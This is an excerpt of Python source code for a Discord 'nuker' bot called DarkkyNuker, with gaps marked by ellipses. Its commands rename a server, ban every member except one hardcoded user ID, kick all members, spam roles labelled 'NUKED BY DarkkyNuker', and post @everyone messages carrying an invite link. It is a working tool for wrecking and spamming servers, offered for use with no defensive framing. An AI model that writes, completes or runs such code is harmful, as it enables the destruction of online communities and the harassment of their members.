...
token = 'token'
channel_names = ['Nuker by Darkky']
message_spam = ['@everyone https://dsc.gg/darkkyofficial ']
webhook_names = ['DarkkyNuker' ]
###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "DarkkyNuker " ))#change this if you want
  print(f''' 
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="DarkkyNuker")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "DarkkyNuker")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="DarkkyNuker")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED BY DarkkyNuker")
